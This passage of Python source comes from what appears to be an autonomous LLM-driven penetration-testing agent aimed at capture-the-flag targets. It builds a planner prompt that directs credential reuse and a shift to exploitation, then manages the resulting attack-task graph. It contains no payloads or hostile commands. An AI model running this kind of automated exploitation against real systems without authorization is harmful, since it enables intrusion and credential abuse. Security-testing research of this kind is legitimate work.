                log.debug("swallowed exception: %s", exc, exc_info=True)
        _review_tool_card = render_tool_contract_card(_review_tool_defs)

        # Plan completeness: a route the service documented itself is not
        # "covered" until that verb has actually been sent. Without this list
        # the review happily ends a run that never POSTed the one route the
        # target advertised.
        _documented_route_block = ""
        try:
            _pending_routes = self._untested_documented_routes()
        except Exception as exc:
            log.debug("documented-route lookup failed: %s", exc)
            _pending_routes = []
        if _pending_routes:
            _route_lines = "\n".join(
                f"  - {method} {url}" for url, method in _pending_routes[:8]
            )
            _documented_route_block = (
                "## Documented Routes Not Yet Exercised\n"
                f"{_route_lines}\n"
                "The service itself advertised these routes/methods. The plan is "
                "NOT complete while any of them is missing: include (or keep) a "
                "task that sends each one with its documented method and body, "
                "using a tool whose contract can express that method.\n\n"
            )

        prompt = (
            f"Just completed: {task.instruction}\n"
            f"Tool: {_task_tool}\n"
            f"Result: {success and 'SUCCESS' or 'FAILED'}\n"
            f"Output: {task_result[:4000]}\n"
            f"{cred_reminder}"
            f"{_aws_fail_reminder}"
            f"{api_reminder}"
            f"{unexpected_data}"
            f"{focus_reminder}"
            f"{_post_exploit_reminder}\n"
            f"{self._format_plan_status()}\n"
            f"{new_discoveries}"
            f"{_topology_diff_text}"
            f"{_absent_text}\n\n"
            f"{_provenance_text}"
            f"{_memory_text}"
            f"{_belief_text}"
            f"## Your Job: Update the Plan\n"
            f"Review the plan and apply relevant changes from:\n"
            f"- TOTAL tasks MUST NOT exceed 15. If the plan already has 12+ tasks, "
            f"you MUST REMOVE low-quality pending tasks before ADDING new ones\n"
            f"- **Target Consistency**: Only create tasks for services and ports that "
            f"were ACTUALLY discovered during reconnaissance (see Current State). "
            f"If you see credentials for a service whose port is NOT in the discovered "
            f"services list, do NOT create tasks for it — those credentials are from a "
            f"different target and are NOT relevant here.\n"
            f"- If credentials or tokens were obtained, ADD tasks that USE them immediately "
            f"(e.g., send authenticated requests to the relevant API endpoint)\n"
            f"- If a task discovered new endpoints/services, ADD exploration tasks for them\n"
            f"- If pending tasks target endpoints that returned errors, REMOVE or CHANGE them\n"
            f"- If a task partially succeeded (some calls worked, some failed), SPLIT it\n"
            f"- REMOVE duplicate tasks that test the same thing with slightly different params\n"
            f"- If 5+ enumeration tasks all returned empty/nothing, STOP adding more "
            f"enumeration tasks — switch to exploitation or credential testing instead\n"
            f"{'- This task FAILED — generate alternative approaches using different tools, parameters, or endpoints. Do NOT retry the same approach.' if not success else ''}\n"
            f"- If the plan has >40 tasks, aggressively CULL low-value/redundant pending "
            f"tasks. Prefer 10-20 high-quality exploitation tasks over 50+ probe tasks.\n\n"
            f"{_documented_route_block}"
            f"Output the COMPLETE updated task list as a JSON array. "
            f"Each task object MUST contain ONLY these keys: id, dependent_task_ids, "
            f"instruction, tool, params, success_condition, reason, priority. Do NOT "
            f"include status or dependencies — the system owns task status. "
            f"{SUCCESS_CONDITION_GUIDE}\n"
            f"Preserve done/failed tasks. Output ONLY valid JSON array.\n\n"
            f"## Tool Contract Card (use EXACT names/params)\n"
            f"{_review_tool_card}"
        )

        try:
            _skip_reason = self._review_skip_reason(task, force)
            if _skip_reason:
                log.info(_skip_reason)
                return
            self._maybe_compress()
            content, _review_model, _review_err = await self._orch._generate_structured(
                stage="plan_review",
                prompt=prompt,
                validator=parse_plan_tasks,
                schema_example=PLANNER_TASKS_SCHEMA_EXAMPLE,
                system_prompt=SYSTEM_PROMPT_PLANNER,
            )
            # The review budget is spent now: the next review must wait for
            # this plan to be tested by real executions.
            self._review_done_this_cycle = True
            self._executions_since_review = 0
            self._stall_review_since_execution = False
            self._evidence_since_review = False
            if _review_model is None:
                new_tasks = self._extract_json_array(content) or []
            else:
                new_tasks = [t.model_dump() for t in _review_model]
            if new_tasks and isinstance(new_tasks, list) and len(new_tasks) > 0:
                # Keep done/failed tasks, replace pending with LLM's updated list
                preserved = [t for t in self.exploitation_plan.tasks
                             if t.status in (
                                 TaskStatus.SUCCESS,
                                 TaskStatus.FAILED,
                                 TaskStatus.ABANDONED,
                                 TaskStatus.READY,
                                 TaskStatus.CREATED,
                             )
                             and t.id != task.id]
                # Add the just-completed task with updated status
                preserved.append(task)
                # Merge in new tasks from LLM (avoid duplicate IDs)
                existing_ids = {t.id for t in preserved}
                # Collect LLM's dependency updates for existing tasks
                llm_dep_updates: dict[str, list] = {}
                _new_added_this_cycle = 0
                _MAX_NEW_PER_CYCLE = 8
                for nt in new_tasks:
                    if not isinstance(nt, dict):
                        continue
                    nt_task = self._task_from_llm_dict(nt)
                    if not nt_task.id:
                        continue
                    if nt_task.id not in existing_ids:
                        # Dedup using shared helper
                        if self._is_duplicate_task(nt_task, preserved):
                            continue
                        # Per-cycle new task limit: prevent LLM from
                        # explosive one-shot plan expansion.  The plan can
                        # still grow across multiple review cycles.
                        if _new_added_this_cycle >= _MAX_NEW_PER_CYCLE:
                            print(f"\n[PLAN-CAP] Review cycle new-task limit reached "
                                  f"({_MAX_NEW_PER_CYCLE}).  Additional tasks deferred.")
                            break
                        preserved.append(nt_task)
                        existing_ids.add(nt_task.id)
                        _new_added_this_cycle += 1
                    else:
                        # LLM updated an existing task — capture its dependency changes,
                        # but only if the update doesn't block a previously-independent task.
                        if "dependent_task_ids" in nt or "dependencies" in nt:
                            pt = next((t for t in preserved if t.id == nt_task.id), None)
                            _new_deps = (
                                nt.get("dependent_task_ids")
                                or nt.get("dependencies")
                                or []
                            )
                            if pt and pt.status in (TaskStatus.READY, TaskStatus.CREATED):
                                _orig_deps = dependency_task_ids(pt)
                                # Allow: (a) task was already independent, or
                                #        (b) new deps are a subset of original (trimming)
                                if not _orig_deps or set(_new_deps).issubset(set(_orig_deps)):
                                    llm_dep_updates[nt_task.id] = list(_new_deps)
                                # Otherwise: ignore LLM's dependency change —
                                # retroactively adding blocking dependencies
                                # to independent tasks breaks plan execution.
                            else:
                                # Done/failed tasks can have their deps updated freely
                                llm_dep_updates[nt_task.id] = list(_new_deps)
                # Apply LLM's dependency updates to preserved tasks
                for t in preserved:
                    if t.id in llm_dep_updates:
                        t.dependencies = deps_from_task_ids(llm_dep_updates[t.id])
                self.exploitation_plan.tasks = preserved

                # Smart cap: trim lowest-quality pending tasks when plan
                # inflates beyond 20.  Done/failed tasks are kept for history.
                # Priority: tasks WITH tools (exploit/probe) are kept before
                # tasks without tools (speculative recon).
                self.exploitation_plan.tasks = self._cap_pending_tasks(preserved, max_total=20)

                self._enforce_write_intent(
                    self.exploitation_plan.tasks, _pre_review
                )

                # ── Dependency resolution: rewrite stale references ──
                # LLM may reference task IDs that were renamed or removed.
                # Resolve broken dependencies by matching on instruction similarity.
                _valid_ids = {t.id for t in self.exploitation_plan.tasks}
                _all_tasks = list(self.exploitation_plan.tasks)
                for _t in self.exploitation_plan.tasks:
                    _deps = dependency_task_ids(_t)
                    if not _deps:
                        continue
                    _resolved = []
                    for _dep_id in _deps:
                        if _dep_id in _valid_ids:
                            # Drop dependency on completed tasks — a DONE/FAILED/
                            # EXHAUSTED task cannot continue to block downstream tasks.
                            _dep_status = ""
                            for _ot in _all_tasks:
                                if _ot.id == _dep_id:
                                    _dep_status = _ot.status
                                    break
                            if _dep_status in (
                                TaskStatus.SUCCESS,
                                TaskStatus.FAILED,
                                TaskStatus.ABANDONED,
                            ):
                                continue  # dependency satisfied, no longer blocking
                            _resolved.append(_dep_id)
                            continue
                        # Try to find a replacement by instruction keyword overlap
                        _dep_inst = ""
                        for _ot in _all_tasks:
                            if _ot.id == _dep_id:
                                _dep_inst = (_ot.instruction or "").lower()
                                break
                        _best, _best_score = None, 0.0
                        if _dep_inst:
                            _dep_words = set(_dep_inst.split())
                            for _ct in self.exploitation_plan.tasks:
                                if _ct.id == _t.id:
                                    continue
                                _ct_inst = (_ct.instruction or "").lower()
                                _ct_words = set(_ct_inst.split())
                                if _dep_words and _ct_words:
                                    _score = len(_dep_words & _ct_words) / len(_dep_words)
                                    if _score > _best_score:
                                        _best_score = _score
                                        _best = _ct.id
                        if _best and _best_score > 0.4:
                            _resolved.append(_best)
                        else:
                            log.warning("Task '%s' depends on unknown task '%s' — "
                                        "dependency removed", _t.id, _dep_id)
                    _t.dependencies = deps_from_task_ids(_resolved)

                # Sanitize: replace blacklisted tools in any LLM-generated tasks
                self._sanitize_plan_tools(self.exploitation_plan.tasks)

                # Cycle detection after plan mutation
                cycle = self._detect_cycle(self.exploitation_plan.tasks)
                if cycle:
                    log.warning("[PLAN REVIEW] cycle detected: %s — breaking",
                                " -> ".join(cycle))
                    self._break_cycle(self.exploitation_plan.tasks, cycle)

                self._persist_plan("plan_review")
                log.info("[PLAN REVIEW] plan updated: %d tasks (%d done, %d failed, %d exhausted, %d pending)",
                         len(preserved),
                         sum(1 for t in preserved if t.status is TaskStatus.SUCCESS),
                         sum(1 for t in preserved if t.status in (TaskStatus.FAILED, TaskStatus.ABANDONED)),
                         sum(1 for t in preserved if t.status is TaskStatus.ABANDONED),
                         sum(1 for t in preserved if t.status in (TaskStatus.READY, TaskStatus.CREATED)))

                # ── Phase log: plan review ──
                if self.phase_logger:
                    _review_text = (
                        f"Task '{task.id}' → {task.status.value}\n"
                        f"Plan: {len(preserved)} tasks — "
                        f"{sum(1 for t in preserved if t.status is TaskStatus.SUCCESS)} done, "
                        f"{sum(1 for t in preserved if t.status in (TaskStatus.FAILED, TaskStatus.ABANDONED))} failed, "
                        f"{sum(1 for t in preserved if t.status in (TaskStatus.READY, TaskStatus.CREATED))} pending"
                    )
                    self.phase_logger.log_phase("plan_review", _review_text,
                        metadata={"task_id": task.id,
                                  "task_status": task.status.value,
                                  "total_tasks": len(preserved)})
        except Exception as e:
            log.warning("Plan review failed: %s — keeping current plan", e)
            self._persist_plan("plan_review")

    def _persist_plan(self, phase: str = "exploit") -> None:
        """Persist the full typed plan (TaskGraph) to a JSON checkpoint.

        Task-level state (status, attempts, dependencies, result summaries)
        is the plan's source of truth for resumability — the legacy aggregate
        Plan DKG node write is removed (PlanMemory + this file own plan state).
        """
        plan = getattr(self, 'exploitation_plan', None)
        if not plan:
            return
        sanitized = re.sub(r"[^a-zA-Z0-9_.-]", "_", self.target_url)
        path = os.path.join("checkpoints", f"plan_{sanitized}_{phase}.json")
        try:
            os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
            with open(path, "w", encoding="utf-8") as f:
                json.dump({
                    "plan_id": plan.plan_id,
                    "phase": plan.phase,
                    "goal": plan.goal,
                    "status": plan.status,
                    "created_at": plan.created_at,
                    "updated_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
                    "tasks": [t.to_dict() for t in plan.tasks],
                }, f, indent=2, default=str)
        except Exception as e:
            log.warning("Plan persistence failed for %s: %s", phase, e)

    def _generate_phase_summary(self, phase: str = "exploit") -> str:
        """Summarize completed phase for the next phase's planning context."""
        plan = getattr(self, 'exploitation_plan', None)
        if not plan or not plan.tasks:
            return ""
        completed = [
            t.instruction for t in plan.tasks
            if t.status is TaskStatus.SUCCESS
        ]
        failed = [
            t.instruction for t in plan.tasks
            if t.status in (TaskStatus.FAILED, TaskStatus.ABANDONED)
        ]
        flags = [n.get("value", "") for n in self.dkg.query_nodes("Flag") if n.get("value", "").startswith("flag{")]
        summary_id = f"summary-{phase}-{plan.plan_id}"
        summary = {
            "summary_id": summary_id, "source_plan_id": plan.plan_id, "phase": phase,
            # Structured (non-double-encoded) fields; readers tolerate
            # legacy JSON-string values from older checkpoints.
            "completed_tasks": completed,
            "key_findings": {
                "flags_found": flags,
                "endpoints": len(self.dkg.query_nodes("Endpoint")),
            },
            "failed_approaches": failed,
            "created_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
        }
        self.dkg.add_node("PlanSummary", summary_id, summary)
        self.dkg.add_edge(plan.plan_id, summary_id, "plan_successor")
        return json.dumps(summary)


    # ── Flag Search ──────────────────────────────────────────────────
